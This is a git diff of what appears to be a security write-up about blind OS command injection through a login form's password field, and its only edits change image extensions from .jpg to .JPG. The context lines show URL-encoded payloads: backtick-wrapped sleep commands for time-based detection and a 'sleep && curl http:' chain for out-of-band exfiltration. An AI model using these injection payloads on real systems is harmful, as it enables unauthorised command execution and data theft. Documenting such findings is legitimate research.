@@ -72,7 +72,7 @@ username=sandh0t%40mail.com&password=%60sleep%2010%60
 
 >HTTP Response
 
-![](/assets/img/4/1.jpg)
+![](/assets/img/4/1.JPG)
 
 
 ## Step 2
@@ -124,7 +124,7 @@ username=sandh0t%40mail.com&password=%60sleep%2030%60
 
 >HTTP Response
 
-![](/assets/img/4/3.jpg)
+![](/assets/img/4/3.JPG)
 
 
 # Out-of-Band (OOB) Payload:
@@ -161,7 +161,7 @@ Success! I was able to receive valid DNS requests, but interestingly, I did not 
 
 >HTTP Response
 
-![](/assets/img/4/7.jpg)
+![](/assets/img/4/7.JPG)
 
 
 
@@ -196,7 +196,7 @@ username=sandsuperhot%40gmail.com&password=%60sleep%2002%20%26%26%20curl%20http:
 
 >HTTP Response
 
-![](/assets/img/4/5.jpg)
+![](/assets/img/4/5.JPG)
 
 
 ## Getting the Web Application Id value:
@@ -225,7 +225,7 @@ username=sandsuperhot%40gmail.com&password=%60sleep%2002%20%26%26%20curl%20http:
 
 >HTTP Response
 
-![](/assets/img/4/6.jpg)
+![](/assets/img/4/6.JPG)
 
 
 
